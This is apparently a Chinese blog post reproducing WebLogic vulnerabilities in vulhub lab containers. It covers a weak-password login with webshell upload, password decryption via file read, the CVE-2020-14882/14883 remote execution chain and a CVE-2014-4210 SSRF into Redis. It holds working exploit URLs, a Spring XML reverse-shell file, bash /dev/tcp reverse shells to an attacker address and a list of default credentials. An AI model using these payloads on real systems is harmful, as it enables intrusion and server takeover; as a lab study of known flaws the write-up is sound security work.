<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Weblogic 常见漏洞分析与利用 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Weblogic 常见漏洞分析与利用" />
<meta property="og:description" content="0x00 前言 一直没有系统的总结过 weblogic 的漏洞，今天通过 vulhub 靶场来复现几个经典的案例。
0x01 基础知识 weblogic简介： WebLogic 是美国 Oracle 公司出品的一个基于 JAVAEE 架构的中间件，是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的Java应用服务器。WebLogic 由纯 Java 开发，长期以来一直被认为是市场上最好的J2EE工具之一，被广泛应用于开发、部署和运行 Java 应用等适用于本地环境和云环境的企业应用。
0x02 漏洞复现 1、Weblogic 弱口令/文件读取漏洞 此测试环境存在两个漏洞，后台存在弱口令，前台存在任意文件读取漏洞。本次测试分别通过这两种漏洞对本靶场进行渗透，最终获取 weblogic 的服务器权限。
漏洞原理： 在搭建好 weblogic 服务后没有修改后台的默认密码或密码设置太简单，导致可以弱口令登录，最终获得服务器权限。
环境搭建： 进入对应目录：
vulhub/weblogic/weak_password 启动本环境：
docker-compose up -d 文件比较大，第一次下载可能时间会比较长。
Weblogic版本：10.3.6
Java版本：1.6
复现过程： 启动环境后直接访问7001端口会出现404页面，这里要访问
http://ip:7001/console 打开 weblogic 后台页面
本环境存在弱口令：weblogic/Oracle@123
使用口令登录后台（注意此环境存在登录限制，错误密码5次之后就会自动锁定）。
weblogic 常用弱口令：
用户名：weblogic、system、admin、WebLogic
密码：weblogic、weblogic123、password、security、system、admin、WebLogic
选择左侧的部署，然后点击安装
然后就可以看到有个上传文件的选项，这里可以上传一个 jsp类型的小马的 war包来拿到shell。
首先将我们的 冰蝎马 shell.jsp 打包成 test.war 。
步骤：新建一个文件夹，里面只有 shell.jsp 文件，输入命令：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/cbc2c8ae1919cf9bdd85815cb44a690a/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-04-18T16:17:04+08:00" />
<meta property="article:modified_time" content="2023-04-18T16:17:04+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Weblogic 常见漏洞分析与利用</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h4><a id="0x00__0"></a>0x00 前言</h4> 
<p>一直没有系统的总结过 weblogic 的漏洞，今天通过 vulhub 靶场来复现几个经典的案例。</p> 
<h4><a id="0x01__2"></a>0x01 基础知识</h4> 
<h5><a id="weblogic_3"></a>weblogic简介：</h5> 
<p>WebLogic 是美国 Oracle 公司出品的一个基于 JAVAEE 架构的中间件，是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的Java应用服务器。WebLogic 由纯 Java 开发，长期以来一直被认为是市场上最好的J2EE工具之一，被广泛应用于开发、部署和运行 Java 应用等适用于本地环境和云环境的企业应用。</p> 
<h4><a id="0x02__5"></a>0x02 漏洞复现</h4> 
<h5><a id="1Weblogic__6"></a>1、Weblogic 弱口令/文件读取漏洞</h5> 
<p>此测试环境存在两个漏洞，后台存在弱口令，前台存在任意文件读取漏洞。本次测试分别通过这两种漏洞对本靶场进行渗透，最终获取 weblogic 的服务器权限。</p> 
<h6><a id="_8"></a>漏洞原理：</h6> 
<p>在搭建好 weblogic 服务后没有修改后台的默认密码或密码设置太简单，导致可以弱口令登录，最终获得服务器权限。</p> 
<h6><a id="_10"></a>环境搭建：</h6> 
<p>进入对应目录：</p> 
<pre><code class="prism language-php">vulhub<span class="token operator">/</span>weblogic<span class="token operator">/</span>weak_password
</code></pre> 
<p>启动本环境：</p> 
<pre><code class="prism language-shell"><span class="token function">docker-compose</span> up -d
</code></pre> 
<p>文件比较大，第一次下载可能时间会比较长。<br> <img src="https://images2.imgbox.com/21/22/ZjNwSYqn_o.png" alt="在这里插入图片描述"></p> 
<ul><li> <p>Weblogic版本：10.3.6</p> </li><li> <p>Java版本：1.6</p> </li></ul> 
<h6><a id="_28"></a>复现过程：</h6> 
<p>启动环境后直接访问7001端口会出现404页面，这里要访问</p> 
<pre><code>http://ip:7001/console
</code></pre> 
<p>打开 weblogic 后台页面</p> 
<p><img src="https://images2.imgbox.com/55/7b/EO57kKRv_o.png" alt="在这里插入图片描述"><br> 本环境存在弱口令：weblogic/Oracle@123<br> 使用口令登录后台（注意此环境存在登录限制，错误密码5次之后就会自动锁定）。</p> 
<blockquote> 
 <p>weblogic 常用弱口令：<br> 用户名：weblogic、system、admin、WebLogic<br> 密码：weblogic、weblogic123、password、security、system、admin、WebLogic</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/a4/e1/oJIyAZmc_o.png" alt="在这里插入图片描述"><br> 选择左侧的部署，然后点击安装</p> 
<p><img src="https://images2.imgbox.com/ef/02/JcysdALI_o.png" alt="在这里插入图片描述"><br> 然后就可以看到有个上传文件的选项，这里可以上传一个 jsp类型的小马的 war包来拿到shell。</p> 
<p><img src="https://images2.imgbox.com/29/43/s6HK9LOe_o.png" alt="在这里插入图片描述"><br> 首先将我们的 冰蝎马 shell.jsp 打包成 test.war 。</p> 
<p>步骤：新建一个文件夹，里面只有 shell.jsp 文件，输入命令：</p> 
<pre><code class="prism language-shell">jar -cvf test.war <span class="token builtin class-name">.</span>
</code></pre> 
<p>test.war 就是打包后生成的文件名称。</p> 
<p>后面的<code>.</code> 是把当前目录下所有文件打包。</p> 
<p><img src="https://images2.imgbox.com/19/8c/ean7KVi2_o.png" alt="在这里插入图片描述"><br> 上传我们制作的 war 包，一直点击下一步</p> 
<p><img src="https://images2.imgbox.com/b4/d3/HEZQBeza_o.png" alt="在这里插入图片描述"><br> 直到出现完成按钮就部署结束了</p> 
<p><img src="https://images2.imgbox.com/3f/c2/O98AhgV4_o.png" alt="在这里插入图片描述"><br> 点击保存，提示更改成功，接下来就可以连接我们的上马了。</p> 
<p><img src="https://images2.imgbox.com/e2/2a/76VMGVL3_o.png" alt="在这里插入图片描述"><br> 连接成功，这里 test 是我们的 war 包名，shell.jsp是里面的小马。</p> 
<p><img src="https://images2.imgbox.com/a9/d7/Q8ZetRVt_o.png" alt="在这里插入图片描述"></p> 
<hr>🆗，借着这个靶场再来说说另一种情况：假如没有弱口令，而是前台存在一个任意文件下载漏洞又该怎么利用呢？ 
<p></p> 
<p>本靶场前端存在任意文件读取漏洞，访问如下 url 可以读取任意文件</p> 
<pre><code>http://ip:7001/hello/file.jsp?path= #接文件路径
</code></pre> 
<p>我们可以通过这个漏洞读取 weblogic 后台的用户密文和密钥文件，密文使用AES加密，AES是对称加密可解密从而获得后台密码。</p> 
<p>Weblogic 后台的密文与密钥这两个文件分别为 config.xml 和 SerializedSystemIni.dat ，在本环境中路径分别为<br> <code>./config/config.xml</code> 和 <code>./security/SerializedSystemIni.dat</code> 当前目录是：<code>/root/Oracle/Middleware/user_projects/domains/base_domain</code></p> 
<blockquote> 
 <p>注：这里我看别的师傅说：因为 SerializedSystemIni.dat 是一个二进制文件，直接用浏览器下载可能引入一些干扰字符。这里需要使用 burpsuite 来读取，然后选中读取到的那一串编码，右键 copy to file 保存为 dat 文件。</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/78/8f/HYG3NSXT_o.png" alt="在这里插入图片描述"></p> 
<p>但是我自己尝试后发现，通过上面方法保存的文件无法解密，burp版本尝试更换了也不行，反而直接读取到的文件更改后缀为 dat 后成功解密了（注意需要删掉前面的空行）。就很玄学。。</p> 
<p>接着读取 config.xml，找到<code>&lt;node-manager-password-encrypted&gt;</code>这项，其值就是加密后的后台密码。<br> <img src="https://images2.imgbox.com/a6/7e/Q9EPiK5t_o.png" alt="在这里插入图片描述"><br> 然后使用工具解密： <a href="https://github.com/TideSec/Decrypt_Weblogic_Password">工具下载链接</a></p> 
<p><img src="https://images2.imgbox.com/f6/bf/8YGrX4fq_o.png" alt="在这里插入图片描述"><br> 成功获得后台密码，假设这里知道用户名，就可以登录然后重复上述步骤getshell了。</p> 
<h5><a id="2Weblogic_CVE202014882CVE202014883_99"></a>2、Weblogic 未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）</h5> 
<p>2020年 Oracle 官方发布了数百个组件的高危漏洞公告。其中组合利用 CVE-2020-14882/CVE-2020-14883 可使攻击者绕过 WebLogic 后台登录限制，远程执行代码获取 WebLogic 服务器权限，利用难度极低，风险极大。</p> 
<h6><a id="_101"></a>漏洞原理：</h6> 
<p>CVE-2020-14882：允许未授权的用户绕过管理控制台的权限验证访问后台。<br> CVE-2020-14883：允许后台任意用户通过HTTP协议执行任意命令。</p> 
<p>这两个漏洞的组合利用，可以让攻击者以未授权的身份登录后台，然后通过一个GET请求在 Weblogic 服务器上远程执行命令。</p> 
<h6><a id="_107"></a>影响版本：</h6> 
<p>10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p> 
<h6><a id="_109"></a>环境搭建：</h6> 
<p>进入对应目录：</p> 
<pre><code class="prism language-php">vulhub<span class="token operator">/</span>weblogic<span class="token operator">/</span><span class="token constant">CVE</span><span class="token operator">-</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">14882</span>
</code></pre> 
<p>启动环境：</p> 
<pre><code class="prism language-shell"><span class="token function">docker-compose</span> up -d
</code></pre> 
<p><img src="https://images2.imgbox.com/08/16/IXU9Sf6X_o.png" alt="在这里插入图片描述"></p> 
<h6><a id="_121"></a>复现过程：</h6> 
<p>访问 http://ip:7001/console 来到登陆页面<br> <img src="https://images2.imgbox.com/5a/07/mKfUH9D4_o.png" alt="在这里插入图片描述"><br> 正常肯定是要账号口令的，这里利用 CVE-2020-14882 漏洞，访问以下URL，即可未授权访问到管理后台页面：</p> 
<pre><code>http://ip:7001/console/css/%252e%252e%252fconsole.portal
或
http://ip:7001/console/images/%252e%252e%252fconsole.portal
</code></pre> 
<blockquote> 
 <p>注：<code>%252e%252e%252f</code> 是经过两次url编码后的<code>../</code>，通过这个就可以实现穿越路径未授权访问后台页面。</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/4c/ca/UlW10fny_o.png" alt="在这里插入图片描述"><br> 点击部署，发现并没有安装按钮，这是因为通过未授权访问的后台权限不足，并没有部署功能，所以也就无法通过上面那种上传war包的方式getshell。</p> 
<p>想要实现服务器RCE 这里要借助第二个漏洞 CVE-2020-14883 ，这个漏洞的利用方式有两种，分别通过两个特殊的类来实现。</p> 
<p><strong>方式一</strong>：<br> 通过 com.tangosol.coherence.mvel2.sh.ShellSession 类实现，这个利用方法只能在 Weblogic 12.2.1 以上版本利用，因为 10.3.6（上面四个受影响版本中只有这一个低于12.2.1）版本没有这个类。</p> 
<p>直接访问如下URL，即可执行命令：</p> 
<pre><code class="prism language-shell">http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb<span class="token operator">=</span>true<span class="token operator">&amp;</span><span class="token assign-left variable">_pageLabel</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">handle</span><span class="token operator">=</span>com.tangosol.coherence.mvel2.sh.ShellSession<span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec('touch /tmp/test');"</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/ac/9e/rZYbxruu_o.png" alt="在这里插入图片描述"><br> 访问后出现404页面，进入docker看一下，发现成功执行了！<br> <img src="https://images2.imgbox.com/6e/1f/HinAMO1C_o.png" alt="在这里插入图片描述"><br> <strong>方式二</strong>：<br> 通过 com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext 类实现，这是一个通杀的方法，对 Weblogic 的所有版本均有效。此方法需要借助 XML 文件，通过访问这个文件来执行命令。</p> 
<p>构造一个反弹shell XML 文件，shell.xml：</p> 
<pre><code class="prism language-html"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>
   <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
   <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span><span class="token cdata">&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1]]&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>Bash反弹一句话拆分说明：</p> 
<table><thead><tr><th>命令</th><th>命令详解</th></tr></thead><tbody><tr><td>bash -i</td><td>产生一个bash交互环境</td></tr><tr><td>&gt;&amp;</td><td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td></tr><tr><td>/dev/tcp/ip/2333</td><td>让目标主机与攻击机的2333端口建立一个tcp连接。</td></tr><tr><td>0&gt;&amp;1</td><td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td></tr></tbody></table> 
<p>完整的解读：Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p> 
<p>然后将其保存在 Weblogic 服务器可以访问到的服务器上（重点！），这里我放在 docker 的宿主机上了，然后开启 web 服务。</p> 
<p>访问链接为：</p> 
<pre><code>http://192.168.50.131:80/shell.xm
</code></pre> 
<p>开启 nc 监听，然后浏览器访问下面链接：</p> 
<pre><code>http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.50.131:80/shell.xml")
</code></pre> 
<blockquote> 
 <p>注：链接里的 <code>http://</code> 必不可少。</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/b1/5b/FV9aIQzh_o.png" alt="在这里插入图片描述"><br> 即可得到反弹shell<br> <img src="https://images2.imgbox.com/f1/9a/GM4eR4MR_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="3Weblogic_SSRFCVE20144210_197"></a>3、Weblogic SSRF漏洞（CVE-2014-4210）</h5> 
<p>SSRF全称：Server-Side Request Forgery，即 服务器端请求伪造。是一个由攻击者构造请求，在目标服务端执行的一个安全漏洞。目标通常是从外网无法访问的内部系统。简单来说就是攻击者利用服务器漏洞以服务器的身份发送一条构造好的请求给其所在内网进行攻击。</p> 
<h6><a id="_200"></a>漏洞原理：</h6> 
<p>Weblogic 的 uddi 组件实现包中有个 ddiexplorer.war文件，其下里 SearchPublicReqistries.jsp 接口存在 SSRF 漏洞，可以利用该漏洞可以发送任意 HTTP 请求，实现攻击内网中 Redis 等脆弱组件。</p> 
<h6><a id="_202"></a>影响版本：</h6> 
<p>10.0.2、10.3.6</p> 
<h6><a id="_204"></a>环境搭建：</h6> 
<p>进入对应目录：</p> 
<pre><code class="prism language-php">vulhub<span class="token operator">/</span>weblogic<span class="token operator">/</span>ssrf
</code></pre> 
<p>启动环境：</p> 
<pre><code class="prism language-shell"><span class="token function">docker-compose</span> up -d
</code></pre> 
<p><img src="https://images2.imgbox.com/10/cf/HXkDhrJw_o.png" alt="在这里插入图片描述"><br> 可以看到同时也启动了一个 Redis 服务。</p> 
<h6><a id="_217"></a>复现过程：</h6> 
<p>访问漏洞存在地址：</p> 
<pre><code>http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp
</code></pre> 
<p><img src="https://images2.imgbox.com/aa/5c/h4CiwRKQ_o.png" alt="在这里插入图片描述"><br> 这里f12查看页面，可以看到引用了外部链接，那么就有可能存在ssrf漏洞。<br> <img src="https://images2.imgbox.com/b4/0b/ziha5A6f_o.png" alt="在这里插入图片描述"><br> 点击 search 然后抓包发送到 Repeater 模块<br> <img src="https://images2.imgbox.com/db/12/gATylIsV_o.png" alt="在这里插入图片描述"><br> 修改 operator 参数用来探测开放IP或端口，这里来测试一下宿主机的7001端口<br> <img src="https://images2.imgbox.com/0f/2b/iApZQd7L_o.png" alt="在这里插入图片描述"><br> <strong>1、主机存活且端口开放，会返回状态码</strong>。<br> <img src="https://images2.imgbox.com/11/20/2LTs2xTz_o.png" alt="在这里插入图片描述"><br> <strong>2、如果访问的是非 HTTP 协议则会返回 did not have a valid SOAP content-type: text/html，其主机端口也是开放的</strong>。<br> <img src="https://images2.imgbox.com/eb/80/9TJOAzf7_o.png" alt="在这里插入图片描述"><br> <strong>3、当访问一个不存在的主机或端口时，会返回 could not connect over HTTP to server</strong>。<br> <img src="https://images2.imgbox.com/dd/da/VKsh3NQD_o.png" alt="在这里插入图片描述"><br> 我们可以通过响应结果，实现探测内网状态的功能。下面我们就来尝试利用 redis 实现反弹shell。</p> 
<p><strong>利用 Redis 反弹 shell</strong>：</p> 
<p>这里因为我们是测试环境，已知内网存在 redis 服务且存在未授权漏洞。如果在真实渗透中可以通过对内网的爆破获取到有关信息。</p> 
<p>先看一下 docker 容器里的 redis 的 IP 地址，执行如下命令：</p> 
<pre><code class="prism language-shell"><span class="token function">docker</span> inspect 容器ID
</code></pre> 
<p>在一大串信息的最下面找到了其IP。<br> <img src="https://images2.imgbox.com/a2/92/7F6Z5Tv6_o.png" alt="在这里插入图片描述"><br> 接着使用 SSRF 漏洞对 172.31.0.2:6739 探测一下<br> <img src="https://images2.imgbox.com/06/4a/cxyfnnAt_o.png" alt="在这里插入图片描述"><br> 可以看到 redis 服务是存活着的。</p> 
<p>下面通过 SSRF 漏洞向 Redis 写入三条命令（Redis 需要以 root 权限执行才能写入），将我们反弹 shell 的脚本写入<code>/etc/crontab</code>文件。crontab是一个可以自动执行定时命令的配置文件，通过它来执行我们反弹 shell 的命令。（详细解释可以看这篇文章：<a href="https://www.cnblogs.com/optimus-prime/p/7154559.html" rel="nofollow">linux下cron命令用法</a>）</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">set</span> s <span class="token string">"<span class="token entity" title="\n">\n</span>* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.50.131/2333 0&gt;&amp;1<span class="token entity" title="\n">\n</span>"</span>
config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /etc/
config <span class="token builtin class-name">set</span> dbfilename <span class="token function">crontab</span>
save
</code></pre> 
<p>上述命令解析：</p> 
<table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td>set s …</td><td>设置一个变量值 “s” 为key， 执行一个反弹 shell 命令为其 value 值</td></tr><tr><td>* * * * *</td><td>即每分钟执行一次命令（上面链接有详细解释）</td></tr><tr><td>config set dir /etc/</td><td>指定工作目录为 /etc/</td></tr><tr><td>config set dbfilename crontab</td><td>指定 RDB 备份文件为 crontab；即所有的 RDB 文件都会储存在 /etc/crontab 下</td></tr></tbody></table> 
<p>还是有不懂的地方可以看看这几篇文章：</p> 
<p><a href="https://www.secpulse.com/archives/5357.html" rel="nofollow">利用redis写webshell</a></p> 
<p><a href="https://www.cnblogs.com/-mo-/p/11487797.html" rel="nofollow">Redis未授权访问反弹shell</a></p> 
<p><a href="https://xz.aliyun.com/t/7974#toc-7" rel="nofollow">浅析Linux下Redis的攻击面(一)</a></p> 
<p>将上面的命令整理成一行，然后进行URL编码：</p> 
<pre><code class="prism language-php">set<span class="token operator">%</span><span class="token number">20</span>s<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">5</span>Cn<span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span>root<span class="token operator">%</span><span class="token number">20</span>bash<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>i<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">2</span>Fdev<span class="token operator">%</span><span class="token number">2</span>Ftcp<span class="token operator">%</span><span class="token number">2</span>F192<span class="token operator">.</span><span class="token number">168.50</span><span class="token number">.131</span><span class="token operator">%</span><span class="token number">2</span>F2333<span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">261</span><span class="token operator">%</span><span class="token number">5</span>Cn<span class="token operator">%</span><span class="token number">22</span>config<span class="token operator">%</span><span class="token number">20</span>set<span class="token operator">%</span><span class="token number">20</span>dir<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">2</span>Fetc<span class="token operator">%</span><span class="token number">2</span>Fconfig<span class="token operator">%</span><span class="token number">20</span>set<span class="token operator">%</span><span class="token number">20</span>dbfilename<span class="token operator">%</span><span class="token number">20</span>crontabsave
</code></pre> 
<p>然后需要用换行符即: <code>\r\n</code> 将其按上面的原始命令行格式分隔开。换行符也需要进行url编码即：<code>%0D%0A</code></p> 
<pre><code class="prism language-php">set<span class="token operator">%</span><span class="token number">20</span>s<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">5</span>Cn<span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span>root<span class="token operator">%</span><span class="token number">20</span>bash<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>i<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">2</span>Fdev<span class="token operator">%</span><span class="token number">2</span>Ftcp<span class="token operator">%</span><span class="token number">2</span>F192<span class="token operator">.</span><span class="token number">168.50</span><span class="token number">.131</span><span class="token operator">%</span><span class="token number">2</span>F2333<span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">261</span><span class="token operator">%</span><span class="token number">5</span>Cn<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>Aconfig<span class="token operator">%</span><span class="token number">20</span>set<span class="token operator">%</span><span class="token number">20</span>dir<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">2</span>Fetc<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>Aconfig<span class="token operator">%</span><span class="token number">20</span>set<span class="token operator">%</span><span class="token number">20</span>dbfilename<span class="token operator">%</span><span class="token number">20</span>crontab<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>Asave
</code></pre> 
<p>再着还需在首末两个地方加上换行符号（原因见下面，不加是执行不了的！），再开头和结尾填充上 aaa ，最终就得到了这个：</p> 
<pre><code class="prism language-php">aaa<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>Aset<span class="token operator">%</span><span class="token number">20</span>s<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">5</span>Cn<span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">20</span>root<span class="token operator">%</span><span class="token number">20</span>bash<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>i<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">2</span>Fdev<span class="token operator">%</span><span class="token number">2</span>Ftcp<span class="token operator">%</span><span class="token number">2</span>F192<span class="token operator">.</span><span class="token number">168.50</span><span class="token number">.131</span><span class="token operator">%</span><span class="token number">2</span>F2333<span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">261</span><span class="token operator">%</span><span class="token number">5</span>Cn<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>Aconfig<span class="token operator">%</span><span class="token number">20</span>set<span class="token operator">%</span><span class="token number">20</span>dir<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">2</span>Fetc<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>Aconfig<span class="token operator">%</span><span class="token number">20</span>set<span class="token operator">%</span><span class="token number">20</span>dbfilename<span class="token operator">%</span><span class="token number">20</span>crontab<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>Asave<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token number">0</span>Aaaa
</code></pre> 
<p>访问上述命令：<br> <img src="https://images2.imgbox.com/c5/91/lJlIAiCw_o.png" alt="在这里插入图片描述"></p> 
<p>我们在开头和结尾加换行符的原因如下图所示：<br> <img src="https://images2.imgbox.com/c5/f9/dK6CxBES_o.png" alt="在这里插入图片描述"><br> nc 监听 2333 端口，反弹 shell 成功！<br> <img src="https://images2.imgbox.com/19/89/qXqLQ1b4_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="4Weblogic_XMLDecoder_CVE201710271_300"></a>4、Weblogic XMLDecoder 反序列化漏洞（CVE-2017-10271）</h5> 
